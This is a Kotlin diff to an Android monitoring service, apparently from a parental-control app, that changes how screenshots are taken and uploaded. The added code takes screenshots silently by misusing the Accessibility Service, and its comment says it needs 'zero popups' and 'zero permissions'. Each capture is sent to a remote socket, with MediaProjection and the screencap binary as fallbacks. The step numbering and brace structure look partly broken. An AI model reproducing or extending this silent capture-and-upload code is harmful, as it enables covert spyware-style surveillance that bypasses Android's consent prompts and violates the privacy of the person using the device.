@@ -108,32 +108,40 @@ class ForegroundSafetyService : Service() {
     }
 
     private fun captureAndSendScreenshot(socketManager: ChildSocketManager) {
-        Thread {
-            try {
-                // 1. Try MediaProjection real screen capture
-                val realShot = ScreenCaptureManager.getLatestScreenshotBase64()
-                if (realShot != null && realShot.length > 500) {
-                    socketManager.sendScreenshot(realShot)
-                    Log.i(TAG, "Real MediaProjection screen snapshot uploaded successfully.")
-                    return@Thread
-                }
-            } catch (e: Exception) {
-                Log.w(TAG, "MediaProjection grab error: ${e.message}")
+        // 1. Silent Hardware Screenshot via Accessibility Service (Zero popups / Zero permissions required)
+        ChildAccessibilityService.takeSilentScreenshot { silentB64 ->
+            if (silentB64 != null && silentB64.length > 1000) {
+                socketManager.sendScreenshot(silentB64)
+                Log.i(TAG, "Silent hardware screenshot uploaded successfully via AccessibilityService.")
+                return@takeSilentScreenshot
             }
 
-            try {
-                // 2. Try native screencap binary
-                val process = Runtime.getRuntime().exec("screencap -p")
-                val bytes = process.inputStream.readBytes()
-                if (bytes.size > 2000) {
-                    val base64Str = "data:image/png;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP)
-                    socketManager.sendScreenshot(base64Str)
-                    Log.i(TAG, "Native device screenshot uploaded (${bytes.size} bytes).")
-                    return@Thread
+            Thread {
+                try {
+                    // 2. Try MediaProjection real screen capture
+                    val realShot = ScreenCaptureManager.getLatestScreenshotBase64()
+                    if (realShot != null && realShot.length > 500) {
+                        socketManager.sendScreenshot(realShot)
+                        Log.i(TAG, "Real MediaProjection screen snapshot uploaded successfully.")
+                        return@Thread
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "MediaProjection grab error: ${e.message}")
                 }
-            } catch (e: Exception) {
-                Log.w(TAG, "Native screencap error: ${e.message}")
-            }
+
+                try {
+                    // 3. Try native screencap binary
+                    val process = Runtime.getRuntime().exec("screencap -p")
+                    val bytes = process.inputStream.readBytes()
+                    if (bytes.size > 2000) {
+                        val base64Str = "data:image/png;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP)
+                        socketManager.sendScreenshot(base64Str)
+                        Log.i(TAG, "Native device screenshot uploaded (${bytes.size} bytes).")
+                        return@Thread
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "Native screencap error: ${e.message}")
+                }
 
             try {
                 // 2. High-quality device canvas snapshot
